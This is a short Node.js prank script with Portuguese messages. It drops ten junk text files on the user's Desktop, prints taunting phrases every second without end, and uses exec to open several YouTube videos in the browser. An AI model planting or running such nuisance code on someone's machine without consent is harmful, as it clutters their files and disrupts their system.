const fs = require('fs');
const path = require('path');
const os = require('os');
const { exec } = require('child_process');

const desktopPath = path.join(os.homedir(), 'Desktop');

const videos = [
    'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
    'https://www.youtube.com/watch?v=2ZIpFytCSVc',
    'https://www.youtube.com/watch?v=kJQP7kiw5Fk',
    'https://www.youtube.com/watch?v=DLzxrzFCyOs'
];

const frases = [
    'PARA DE USAR WINDOWS KKK',
    'AOOOO POTENCIA KKK'
];

for (let i = 0; i < 10; i++) {
    const nomeArquivo = `lixo_${Math.random().toString(36).substring(7)}.txt`;
    fs.writeFileSync(path.join(desktopPath, nomeArquivo), 'Você foi trollado kkkkk');
}

setInterval(() => {
    const frase = frases[Math.floor(Math.random() * frases.length)];
    console.log(frase);
}, 1000);

for (let i = 0; i < 5; i++) {
    const video = videos[Math.floor(Math.random() * videos.length)];
    exec(`start ${video}`);
}
